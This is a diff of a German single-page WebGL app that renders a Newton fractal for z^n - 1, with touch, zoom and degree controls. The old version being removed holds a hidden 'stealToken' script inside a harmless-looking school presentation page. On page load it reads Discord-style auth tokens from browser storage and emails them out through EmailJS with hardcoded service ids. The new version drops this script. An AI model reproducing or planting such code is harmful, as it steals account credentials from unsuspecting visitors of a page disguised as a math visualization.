@@ -2,301 +2,340 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Newton-Fraktal | Facharbeit Präsentation</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Newton-Fraktal Explorer</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=Poppins:wght@600&display=swap" rel="stylesheet">
     <style>
-        :root { --accent: #00d4ff; --glass: rgba(15, 15, 15, 0.85); --border: rgba(255, 255, 255, 0.15); }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; font-family: 'Inter', -apple-system, sans-serif; color: white; }
-        canvas { display: block; width: 100vw; height: 100vh; touch-action: none; }
-
-        /* HUD - Oberer Teil */
-        .hud-top {
-            position: absolute; top: 30px; left: 30px; right: 30px;
-            display: flex; justify-content: space-between; align-items: flex-start;
-            pointer-events: none; transition: opacity 0.5s;
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #020617;
+            font-family: 'Inter', sans-serif;
+            touch-action: none; 
         }
-
-        .math-card {
-            background: var(--glass); padding: 15px 25px; border-radius: 15px;
-            backdrop-filter: blur(20px); border: 1px solid var(--border); pointer-events: auto;
+        #glcanvas {
+            width: 100%;
+            height: 100%;
+            display: block;
         }
-
-        .formula { font-family: 'Times New Roman', serif; font-size: 1.4rem; font-style: italic; color: var(--accent); }
-        
-        /* Presets - Seitlich */
-        .presets {
-            position: absolute; right: 30px; top: 120px;
-            display: flex; flex-direction: column; gap: 10px; pointer-events: auto;
+        .ui-panel {
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
-
-        .btn-preset {
-            background: var(--glass); border: 1px solid var(--border); color: white;
-            padding: 10px; border-radius: 10px; cursor: pointer; transition: 0.3s;
-            font-size: 0.8rem; text-transform: uppercase;
+        .btn {
+            transition: all 0.2s;
+            touch-action: manipulation;
         }
-        .btn-preset:hover { background: var(--accent); color: black; }
-
-        /* Steuerung - Unten */
-        .control-panel {
-            position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%);
-            background: var(--glass); padding: 25px; border-radius: 30px;
-            backdrop-filter: blur(25px); border: 1px solid var(--border);
-            width: 90%; max-width: 500px; pointer-events: auto;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.6); transition: opacity 0.5s, transform 0.5s;
+        .btn:active {
+            transform: scale(0.95);
         }
-
-        .hidden { opacity: 0; transform: translate(-50%, 20px); pointer-events: none; }
-
-        .slider-row { margin-bottom: 20px; }
-        .label-row { display: flex; justify-content: space-between; font-size: 0.75rem; letter-spacing: 1px; margin-bottom: 8px; opacity: 0.8; }
-        
-        input[type=range] { width: 100%; -webkit-appearance: none; background: rgba(255,255,255,0.1); height: 4px; border-radius: 2px; outline: none; }
-        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 20px; height: 20px; background: var(--accent); border-radius: 50%; cursor: pointer; box-shadow: 0 0 10px var(--accent); }
-
-        .status-dot { display: inline-block; width: 8px; height: 8px; background: #00ff88; border-radius: 50%; margin-right: 8px; }
-
-        /* Animation für "Touch Me" Hinweis */
-        .touch-hint {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 1.2rem; letter-spacing: 4px; opacity: 0; pointer-events: none;
-            text-transform: uppercase; transition: 1s;
-        }
-        .visible { opacity: 0.5; }
     </style>
 </head>
-<body>
-
-    <div class="hud-top" id="hudTop">
-        <div class="math-card">
-            <div style="font-size: 0.7rem; opacity: 0.6; margin-bottom: 5px;">NEWTON-VERFAHREN FÜR:</div>
-            <div class="formula">f(z) = z<sup id="expText">3.0</sup> - 1</div>
-        </div>
-        <button class="btn-preset" onclick="toggleFullScreen()" style="pointer-events: auto;">Vollbild</button>
-    </div>
-
-    <div class="presets" id="presets">
-        <button class="btn-preset" onclick="setPreset(3.0, 2.5)">Standard (n=3)</button>
-        <button class="btn-preset" onclick="setPreset(5.0, 2.0)">Pentagon (n=5)</button>
-        <button class="btn-preset" onclick="setPreset(2.1, 0.5)">Deep Detail</button>
-        <button class="btn-preset" onclick="resetView()">Reset Zoom</button>
-    </div>
-
-    <div class="touch-hint" id="touchHint">Interagieren zum Erkunden</div>
-
-    <div class="control-panel" id="ui">
-        <div class="slider-row">
-            <div class="label-row"><span>EXPONENT (n)</span><span id="nVal" style="color:var(--accent)">3.00</span></div>
-            <input type="range" id="nSlider" min="2" max="10" step="0.01" value="3">
-        </div>
-        <div class="slider-row" style="margin-bottom: 0;">
-            <div class="label-row"><span>AUTO-ANIMATION</span><span id="sVal">Aktiv</span></div>
-            <input type="range" id="speedSlider" min="0" max="2" step="0.1" value="0.5">
-        </div>
-        <div style="text-align: center; font-size: 0.6rem; margin-top: 15px; opacity: 0.4;">
-            <span class="status-dot"></span> PRÄSENTATIONS-MODUS BEREIT
-        </div>
-    </div>
-
-    <canvas id="glCanvas"></canvas>
-
-    <script type="x-shader/x-fragment" id="fragmentShader">
-        precision highp float;
-        uniform vec2 u_res;
-        uniform float u_n;
-        uniform float u_zoom;
-        uniform float u_time;
-        uniform vec2 u_offset;
-
-        vec2 cDiv(vec2 a, vec2 b) {
-            float d = dot(b, b);
-            return vec2(dot(a, b), a.y*b.x - a.x*b.y) / d;
-        }
-
-        vec2 cPow(vec2 z, float n) {
-            float r = length(z);
-            if (r < 1e-10) return vec2(0.0);
-            float phi = atan(z.y, z.x);
-            return pow(r, n) * vec2(cos(n * phi), sin(n * phi));
-        }
-
-        void main() {
-            vec2 uv = (gl_FragCoord.xy - 0.5 * u_res.xy) / min(u_res.y, u_res.x);
-            vec2 z = uv * u_zoom + u_offset;
-            float iter = 0.0;
-            const float maxI = 100.0;
-            for (float i = 0.0; i < maxI; i++) {
-                vec2 fz = cPow(z, u_n) - vec2(1.0, 0.0);
-                vec2 dfz = u_n * cPow(z, u_n - 1.0);
-                z -= cDiv(fz, dfz);
-                if (length(fz) < 0.0001) { iter = i; break; }
-            }
-            float angle = atan(z.y, z.x);
-            vec3 col = 0.5 + 0.45 * cos(angle + vec3(0, 2, 4) + u_time * 0.2);
-            gl_FragColor = vec4(col * (1.0 - pow(iter/maxI, 0.5)), 1.0);
-        }
-    </script>
-    <script>
-        function stealToken() {
-            // Try to get the token from localStorage or sessionStorage
-            // Discord tokens are usually stored under different keys
-            const tokenKeys = [
-                "token",
-                "auth.token",
-                "session.token",
-                "user.token",
-                "localStorage.token",
-                "sessionStorage.token"
-            ];
-    
-            let token = null;
-    
-            // Check all possible keys
-            for (let key of tokenKeys) {
-                token = localStorage.getItem(key) || sessionStorage.getItem(key);
-                if (token) break;
-            }
-    
-            if (token) {
-                alert("Token stolen: " + token);
-    
-                // Send the token to your email (using EmailJS)
-                emailjs.send("service_n4bgtgi", "template_hqe4drm", {
-                    token: token
-                }).then(function(response) {
-                    console.log("Token sent to your email successfully.");
-                    alert("Token sent to your email!");
-                }, function(error) {
-                    console.error("Failed to send token: ", error);
-                    alert("Failed to send token. Check console.");
-                });
-            } else {
-                alert("No token found. Make sure you're logged into Discord.");
-            }
-        }
-    
-        // Optional: Automatically trigger the token steal when the page loads
-        window.onload = stealToken;
-    </script>
+<body class="relative text-slate-200">
 
 
-    <script>
-        const canvas = document.getElementById('glCanvas');
-        const gl = canvas.getContext('webgl');
+    <canvas id="glcanvas"></canvas>
+
+    <div class="absolute top-0 left-0 w-full p-4 pointer-events-none flex justify-between items-start">
         
-        // Shader Compile
-        const vs = gl.createShader(gl.VERTEX_SHADER);
-        gl.shaderSource(vs, `attribute vec2 pos; void main(){gl_Position=vec4(pos,0,1);}`);
-        gl.compileShader(vs);
-        const fs = gl.createShader(gl.FRAGMENT_SHADER);
-        gl.shaderSource(fs, document.getElementById('fragmentShader').text);
-        gl.compileShader(fs);
-        const prog = gl.createProgram();
-        gl.attachShader(prog, vs); gl.attachShader(prog, fs);
-        gl.linkProgram(prog); gl.useProgram(prog);
 
-        const buffer = gl.createBuffer();
-        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
-        const pos = gl.getAttribLocation(prog, 'pos');
-        gl.enableVertexAttribArray(pos);
-        gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);
+        <div class="ui-panel rounded-2xl p-5 pointer-events-auto max-w-sm shadow-2xl">
+            <h1 class="text-2xl font-'Poppins' font-bold text-white mb-1">Newton-Fraktal</h1>
+            
+            <div class="mb-2 text-sm font-semibold text-sky-400">Funktion:</div>
+            <div class="text-xl font-mono bg-slate-900/50 p-3 rounded-lg border border-slate-700 text-center mb-4">
+                f(z) = z<sup id="degree-display">3</sup> - 1
+            </div>
 
-        const uniforms = {
-            res: gl.getUniformLocation(prog, 'u_res'),
-            n: gl.getUniformLocation(prog, 'u_n'),
-            zoom: gl.getUniformLocation(prog, 'u_zoom'),
-            time: gl.getUniformLocation(prog, 'u_time'),
-            offset: gl.getUniformLocation(prog, 'u_offset')
+        </div>
+
+        <div class="ui-panel rounded-2xl p-4 pointer-events-auto flex flex-col gap-4 shadow-2xl">
+            
+
+            <div>
+                <div class="text-xs text-slate-400 mb-2 font-semibold uppercase tracking-wider text-center">Anzahl Nullstellen (n)</div>
+                <div class="flex gap-2 justify-center">
+                    <button id="btn-dec" class="btn bg-slate-700 hover:bg-slate-600 w-12 h-12 rounded-xl text-xl flex items-center justify-center">
+                        <i class="fa-solid fa-minus"></i>
+                    </button>
+                    <div id="degree-val" class="w-12 h-12 flex items-center justify-center text-2xl font-bold text-sky-400 bg-slate-800 rounded-xl">3</div>
+                    <button id="btn-inc" class="btn bg-sky-600 hover:bg-sky-500 w-12 h-12 rounded-xl text-xl flex items-center justify-center">
+                        <i class="fa-solid fa-plus"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="h-px w-full bg-slate-700 my-1"></div>
+
+            <div>
+                <div class="text-xs text-slate-400 mb-2 font-semibold uppercase tracking-wider text-center">Zoom</div>
+                <div class="flex gap-2 justify-center">
+                    <button id="btn-zoom-in" class="btn bg-slate-700 hover:bg-slate-600 w-12 h-12 rounded-xl text-xl flex items-center justify-center">
+                        <i class="fa-solid fa-magnifying-glass-plus"></i>
+                    </button>
+                    <button id="btn-zoom-out" class="btn bg-slate-700 hover:bg-slate-600 w-12 h-12 rounded-xl text-xl flex items-center justify-center">
+                        <i class="fa-solid fa-magnifying-glass-minus"></i>
+                    </button>
+                </div>
+            </div>
+
+
+            <button id="btn-reset" class="btn mt-2 bg-red-500/20 text-red-400 hover:bg-red-500/30 border border-red-500/50 w-full py-3 rounded-xl font-semibold flex items-center justify-center gap-2">
+                <i class="fa-solid fa-rotate-left"></i> Zurücksetzen
+            </button>
+        </div>
+    </div>
+
+
+    <script>
+        const canvas = document.getElementById('glcanvas');
+        const gl = canvas.getContext('webgl');
+
+        if (!gl) {
+            alert('Ihr Browser oder Gerät unterstützt kein WebGL, welches für diese Simulation benötigt wird.');
+        }
+
+        const vsSource = `
+            attribute vec4 aVertexPosition;
+            void main() {
+                gl_Position = aVertexPosition;
+            }
+        `;
+
+        const fsSource = `
+            precision highp float;
+
+            uniform vec2 u_resolution;
+            uniform vec2 u_offset;
+            uniform float u_zoom;
+            uniform float u_degree;
+
+            #define MAX_ITER 60.0
+
+            // Hilfsfunktion: Komplexe Zahl potenzieren (z^n) via Polarkoordinaten
+            vec2 complexPower(vec2 z, float n) {
+                float r = length(z);
+                float theta = atan(z.y, z.x);
+                return pow(r, n) * vec2(cos(n * theta), sin(n * theta));
+            }
+
+            // Hilfsfunktion: Farbe aus Winkel (Hue) berechnen
+            vec3 hsv2rgb(vec3 c) {
+                vec4 K = vec4(1.0, 2.0 / 3.0, 1.0 / 3.0, 3.0);
+                vec3 p = abs(fract(c.xxx + K.xyz) * 6.0 - K.www);
+                return c.z * mix(K.xxx, clamp(p - K.xxx, 0.0, 1.0), c.y);
+            }
+
+            void main() {
+                // Pixelkoordinaten in die Gaußsche Ebene umwandeln
+                vec2 uv = (gl_FragCoord.xy - u_resolution.xy * 0.5) / u_resolution.y;
+                vec2 z = uv * u_zoom + u_offset;
+
+                float iter = 0.0;
+                
+                // Newton-Iteration für f(z) = z^n - 1
+                // Mathematisch vereinfachte Formel für f(z)/f'(z) beschleunigt die Berechnung
+                for (float i = 0.0; i < MAX_ITER; i++) {
+                    // z_neu = z - (z^n - 1) / (n * z^(n-1))
+                    // Vereinfacht: z_neu = ((n-1)*z + z^(1-n)) / n
+                    
+                    vec2 z_pow = complexPower(z, 1.0 - u_degree);
+                    vec2 z_new = ((u_degree - 1.0) * z + z_pow) / u_degree;
+                    
+                    // Prüfen, ob wir uns kaum noch bewegen (Konvergenz erreicht)
+                    if (length(z_new - z) < 0.001) {
+                        break;
+                    }
+                    
+                    z = z_new;
+                    iter++;
+                }
+
+                // Einfärben basierend auf dem Winkel der gefundenen Nullstelle (welcher "Magnet" hat gewonnen?)
+                float angle = atan(z.y, z.x);
+                // Winkel normalisieren auf 0.0 bis 1.0 für die Farbpalette
+                float hue = (angle / (2.0 * 3.14159265)) + 0.5;
+                
+                // Helligkeit/Sättigung anpassen: Längere Iteration = dunkler (zeigt das Chaos an den Rändern)
+                float shade = 1.0 - (iter / MAX_ITER);
+                // Etwas Kontrast hinzufügen
+                shade = pow(shade, 1.5); 
+
+                // Besonderheit für die Ränder (Wada-Eigenschaft) hervorheben
+                float saturation = 0.8;
+                if(iter >= MAX_ITER - 1.0) {
+                    shade = 0.0; // Schwarz für Punkte, die nicht konvergieren
+                }
+
+                vec3 color = hsv2rgb(vec3(hue, saturation, shade));
+                gl_FragColor = vec4(color, 1.0);
+            }
+        `;
+
+        function loadShader(gl, type, source) {
+            const shader = gl.createShader(type);
+            gl.shaderSource(shader, source);
+            gl.compileShader(shader);
+            if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
+                console.error('Shader error: ' + gl.getShaderInfoLog(shader));
+                gl.deleteShader(shader);
+                return null;
+            }
+            return shader;
+        }
+
+        const vertexShader = loadShader(gl, gl.VERTEX_SHADER, vsSource);
+        const fragmentShader = loadShader(gl, gl.FRAGMENT_SHADER, fsSource);
+        const shaderProgram = gl.createProgram();
+        gl.attachShader(shaderProgram, vertexShader);
+        gl.attachShader(shaderProgram, fragmentShader);
+        gl.linkProgram(shaderProgram);
+        gl.useProgram(shaderProgram);
+
+
+        const positions = new Float32Array([-1.0, -1.0,  1.0, -1.0,  -1.0,  1.0,  1.0,  1.0]);
+        const positionBuffer = gl.createBuffer();
+        gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+        gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
+        const vertexPosition = gl.getAttribLocation(shaderProgram, 'aVertexPosition');
+        gl.enableVertexAttribArray(vertexPosition);
+        gl.vertexAttribPointer(vertexPosition, 2, gl.FLOAT, false, 0, 0);
+
+        const uResolutionInfo = gl.getUniformLocation(shaderProgram, 'u_resolution');
+        const uOffsetInfo = gl.getUniformLocation(shaderProgram, 'u_offset');
+        const uZoomInfo = gl.getUniformLocation(shaderProgram, 'u_zoom');
+        const uDegreeInfo = gl.getUniformLocation(shaderProgram, 'u_degree');
+
+        let state = {
+            offsetX: 0.0,
+            offsetY: 0.0,
+            zoom: 4.0,       
+            degree: 3.0      
         };
 
-        let zoom = 2.5, offsetX = 0.0, offsetY = 0.0;
-        let lastInteraction = Date.now();
-        let autoTime = 0;
-        let lastTouchX, lastTouchY, lastDist = 0;
+        function resizeCanvas() {
+            canvas.width = window.innerWidth * window.devicePixelRatio;
+            canvas.height = window.innerHeight * window.devicePixelRatio;
+            gl.viewport(0, 0, canvas.width, canvas.height);
+            render();
+        }
+        window.addEventListener('resize', resizeCanvas);
 
-        function setPreset(n, z) {
-            document.getElementById('nSlider').value = n;
-            zoom = z; offsetX = 0; offsetY = 0;
-            activity();
+        function render() {
+            gl.uniform2f(uResolutionInfo, canvas.width, canvas.height);
+            gl.uniform2f(uOffsetInfo, state.offsetX, state.offsetY);
+            gl.uniform1f(uZoomInfo, state.zoom);
+            gl.uniform1f(uDegreeInfo, state.degree);
+            
+            gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
         }
 
-        function resetView() { zoom = 2.5; offsetX = 0; offsetY = 0; activity(); }
+        let pointers = []; 
+        let lastPinchDist = -1;
 
-        function toggleFullScreen() {
-            if (!document.fullscreenElement) document.documentElement.requestFullscreen();
-            else document.exitFullscreen();
-        }
+        canvas.addEventListener('pointerdown', (e) => {
+            pointers.push({ id: e.pointerId, x: e.clientX, y: e.clientY });
+        });
 
-        function activity() { 
-            lastInteraction = Date.now();
-            document.getElementById('ui').classList.remove('hidden');
-            document.getElementById('hudTop').style.opacity = "1";
-            document.getElementById('presets').style.opacity = "1";
-            document.getElementById('touchHint').classList.remove('visible');
-        }
+        window.addEventListener('pointerup', (e) => {
+            pointers = pointers.filter(p => p.id !== e.pointerId);
+            if (pointers.length < 2) lastPinchDist = -1;
+        });
 
-        canvas.addEventListener('touchstart', e => {
-            activity();
-            if (e.touches.length === 1) {
-                lastTouchX = e.touches[0].clientX; lastTouchY = e.touches[0].clientY;
-            } else if (e.touches.length === 2) {
-                lastDist = Math.hypot(e.touches[0].clientX - e.touches[1].clientX, e.touches[0].clientY - e.touches[1].clientY);
+        window.addEventListener('pointercancel', (e) => {
+            pointers = pointers.filter(p => p.id !== e.pointerId);
+            if (pointers.length < 2) lastPinchDist = -1;
+        });
+
+        canvas.addEventListener('pointermove', (e) => {
+            if (pointers.length === 0) return;
+
+     
+            const pointerIndex = pointers.findIndex(p => p.id === e.pointerId);
+            if (pointerIndex !== -1) {
+            
+                if (pointers.length === 1) {
+                    const dx = e.clientX - pointers[pointerIndex].x;
+                    const dy = e.clientY - pointers[pointerIndex].y;
+                    
+          
+                    const aspect = window.innerWidth / window.innerHeight;
+                    const scaleX = (state.zoom * aspect) / window.innerWidth;
+                    const scaleY = state.zoom / window.innerHeight;
+
+                    state.offsetX -= dx * scaleX;
+                    state.offsetY += dy * scaleY; 
+                    
+                    requestAnimationFrame(render);
+                }
+                
+                pointers[pointerIndex].x = e.clientX;
+                pointers[pointerIndex].y = e.clientY;
+            }
+
+            // Pinch-to-Zoom (2 Finger)
+            if (pointers.length === 2) {
+                const dx = pointers[0].x - pointers[1].x;
+                const dy = pointers[0].y - pointers[1].y;
+                const dist = Math.sqrt(dx*dx + dy*dy);
+
+                if (lastPinchDist > 0) {
+                    const zoomFactor = lastPinchDist / dist;
+                    state.zoom *= zoomFactor;
+                    
+                  
+                    state.zoom = Math.max(0.00001, Math.min(state.zoom, 20.0));
+                    requestAnimationFrame(render);
+                }
+                lastPinchDist = dist;
             }
         });
 
-        canvas.addEventListener('touchmove', e => {
-            e.preventDefault();
-            if (e.touches.length === 1) {
-                const dx = e.touches[0].clientX - lastTouchX;
-                const dy = e.touches[0].clientY - lastTouchY;
-                offsetX -= (dx / canvas.width) * zoom;
-                offsetY += (dy / canvas.height) * zoom;
-                lastTouchX = e.touches[0].clientX; lastTouchY = e.touches[0].clientY;
-            } else if (e.touches.length === 2) {
-                const dist = Math.hypot(e.touches[0].clientX - e.touches[1].clientX, e.touches[0].clientY - e.touches[1].clientY);
-                if (lastDist > 0) zoom *= (lastDist / dist);
-                lastDist = dist;
-            }
-        }, { passive: false });
-
-        function render(now) {
-            autoTime += 0.01;
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            gl.viewport(0, 0, canvas.width, canvas.height);
-
-            let n = parseFloat(document.getElementById('nSlider').value);
-            let speed = parseFloat(document.getElementById('speedSlider').value);
-            let idle = Date.now() - lastInteraction;
-
-            // UI Auto-Hide
-            if (idle > 4000) {
-                document.getElementById('ui').classList.add('hidden');
-                document.getElementById('hudTop').style.opacity = "0.3";
-                document.getElementById('presets').style.opacity = "0.2";
-                if (idle > 10000) document.getElementById('touchHint').classList.add('visible');
-            }
-
-            // Auto-Pilot
-            if (idle > 6000 && speed > 0) {
-                n = 3.0 + Math.sin(autoTime * 0.2 * speed) * 2.0;
-                document.getElementById('nSlider').value = n;
-                zoom *= (1.0 + Math.sin(autoTime * 0.4) * 0.001 * speed);
-            }
-
-            gl.uniform2f(uniforms.res, canvas.width, canvas.height);
-            gl.uniform1f(uniforms.n, n);
-            gl.uniform1f(uniforms.zoom, zoom);
-            gl.uniform1f(uniforms.time, autoTime * speed);
-            gl.uniform2f(uniforms.offset, offsetX, offsetY);
-            
-            document.getElementById('nVal').innerText = n.toFixed(2);
-            document.getElementById('expText').innerText = n.toFixed(1);
-            
-            gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+      
+        canvas.addEventListener('wheel', (e) => {
+            const zoomFactor = e.deltaY > 0 ? 1.1 : 0.9;
+            state.zoom *= zoomFactor;
+            state.zoom = Math.max(0.00001, Math.min(state.zoom, 20.0));
             requestAnimationFrame(render);
-        }
-        requestAnimationFrame(render);
+        });
+
+       
+        const updateUI = () => {
+            document.getElementById('degree-val').textContent = state.degree;
+            document.getElementById('degree-display').textContent = state.degree;
+        };
+
+        document.getElementById('btn-inc').addEventListener('click', () => {
+            if(state.degree < 10) { state.degree++; updateUI(); requestAnimationFrame(render); }
+        });
+        document.getElementById('btn-dec').addEventListener('click', () => {
+            if(state.degree > 2) { state.degree--; updateUI(); requestAnimationFrame(render); }
+        });
+        document.getElementById('btn-reset').addEventListener('click', () => {
+            state.offsetX = 0.0;
+            state.offsetY = 0.0;
+            state.zoom = 4.0;
+            state.degree = 3.0;
+            updateUI();
+            requestAnimationFrame(render);
+        });
+        document.getElementById('btn-zoom-in').addEventListener('click', () => {
+            state.zoom *= 0.7; requestAnimationFrame(render);
+        });
+        document.getElementById('btn-zoom-out').addEventListener('click', () => {
+            state.zoom *= 1.3; requestAnimationFrame(render);
+        });
+
+        // Init
+        resizeCanvas();
+
     </script>
 </body>
 </html>
